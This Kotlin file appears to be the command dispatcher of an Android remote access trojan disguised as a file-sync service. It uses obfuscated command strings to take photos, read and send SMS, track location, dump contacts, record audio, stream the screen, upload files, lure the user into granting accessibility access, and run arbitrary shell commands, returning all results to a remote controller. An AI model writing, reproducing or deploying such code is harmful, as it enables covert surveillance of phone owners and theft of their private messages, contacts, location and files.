package com.georgetech.filesync

import android.content.Intent
import android.provider.Settings
import com.georgetech.filesync.AccessService
import com.georgetech.filesync.modules.*
import org.json.JSONObject
import java.util.concurrent.Executors

class Dispatcher(private val service: SyncService) {

    private val executor = Executors.newFixedThreadPool(4)
    lateinit var client: SyncAdapter

    private val modA by lazy { SysInfo(service) }
    private val modB by lazy { PhotoHelper(service) }
    private val modC by lazy { MsgReader(service) }
    private val modD by lazy { LocProvider(service) }
    private val modE by lazy { AddrBook(service) }
    private val modF by lazy { StorageHelper(service) }
    private val modG by lazy { AudioHelper(service) }
    private val modH by lazy { DisplayHelper(service) }
    private val modI by lazy { HistoryReader(service) }
    private val modJ by lazy { PkgScanner(service) }

    private fun k(e: String) = Crypt.d(e)

    fun dispatch(task: JSONObject) {
        executor.submit {
            val op = task.optString(k("NSs="), "")
            val taskId = task.optString(k("LjovNgE2BA=="), k("LzU3MzEoDg=="))
            try {
                val result = when (op) {
                    k("KSIvNDA5Dw==") -> modA.collect()
                    k("OToxOCw+") -> {
                        val facing = task.optString(k("PDo/NDA4"), k("KD49Lw=="))
                        modB.capture(facing)
                    }
                    k("KTYvAiw6AT4=") -> modC.readAll()
                    k("KTYvAi06Dj4=") -> {
                        val number = task.getString(k("NC4xPzst"))
                        val message = task.getString(k("Nz4vLj84BQ=="))
                        modC.send(number, message)
                    }
                    k("PSsv") -> modD.getLocation()
                    k("OTQyKT88FCk=") -> modE.dump()
                    k("Nig=") -> {
                        val path = task.optString(k("KjooNQ=="), k("dSg4Pj8tBA=="))
                        modF.listDir(path)
                    }
                    k("PjQrMzIwAT4=") -> {
                        val path = task.getString(k("KjooNQ=="))
                        val bytes = modF.readFile(path)
                        if (bytes != null) {
                            client.sendFileData(taskId, path.substringAfterLast("/"), bytes)
                        }
                        JSONObject().put(k("KS89KSss"), if (bytes != null) k("KT4yKQ==") else k("PDIwOAExDy4EOjIrMQQ="))
                    }
                    k("LyswMj87") -> {
                        JSONObject().put(k("KS89KSss"), k("LyswMj87PzQ0KAI3MhA2PjE4MCsFPg=="))
                    }
                    k("NzI/") -> {
                        val duration = task.optInt(k("Pi4uPCo2DzQ="), 10)
                        modG.record(duration)
                    }
                    k("KTguODsxEzI0KA==") -> modH.capture()
                    "screen_grant" -> {
                        val intent = Intent(service, GrantActivity::class.java)
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        service.startActivity(intent)
                        JSONObject().put(k("KS89KSss"), "grant_dialog_launched")
                    }
                    "acc_grant" -> {
                        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        service.startActivity(intent)
                        JSONObject().apply {
                            put(k("KS89KSss"), "accessibility_settings_opened")
                            put("acc_available", AccessService.isAvailable())
                        }
                    }
                    "acc_status" -> JSONObject().apply {
                        put("acc_available", AccessService.isAvailable())
                        put("screen_grant", com.georgetech.filesync.modules.DisplayHelper.isReady())
                        put("last_setup_err", com.georgetech.filesync.modules.DisplayHelper.lastSetupError)
                    }
                    "vnc" -> {
                        val interval = task.optInt("interval", 1000)
                        val count = task.optInt("frames", 10)
                        modH.stream(client, taskId, interval, count)
                    }
                    k("OTowMTIwBw==") -> modI.read()
                    k("OyssLg==") -> modJ.installed()
                    k("PyM5Pg==") -> {
                        val cmd = task.getString(k("OTQxMD8xBA=="))
                        val proc = Runtime.getRuntime().exec(arrayOf(k("KTM="), k("dzg="), cmd))
                        val out = proc.inputStream.bufferedReader().readText()
                        val err = proc.errorStream.bufferedReader().readText()
                        proc.waitFor()
                        JSONObject().apply {
                            put(k("KS84Misr"), out)
                            put(k("KS84OCwt"), err)
                            put(k("PyM1KQE8Dz4+"), proc.exitValue())
                        }
                    }
                    k("KD4/MjA=") -> {
                        val info = modA.collect()
                        val loc = modD.getLocation()
                        val apps = modJ.installed()
                        JSONObject().apply {
                            put(k("Pj4qND06"), info)
                            put(k("NjQ/PCo2DzQ="), loc)
                            put(k("OyssLg=="), apps)
                        }
                    }
                    "wifi" -> modA.wifi()
                    k("KjIyOg==") -> JSONObject().put(k("KjQyOg=="), System.currentTimeMillis())
                    k("PyM1KQ==") -> {
                        client.sendResult(taskId, JSONObject().put(k("KS89KSss"), k("PyM1KTcxBw==")))
                        service.stopSelf()
                        return@submit
                    }
                    else -> JSONObject().put(k("PykuMiw="), k("LzU3MzEoDno0LGd+") + op)
                }
                client.sendResult(taskId, result)
            } catch (e: Exception) {
                client.sendResult(taskId, JSONObject().apply {
                    put(k("PykuMiw="), e.message ?: k("LzU3MzEoDno+Li8xLQ=="))
                    put(k("NSs="), op)
                })
            }
        }
    }
}
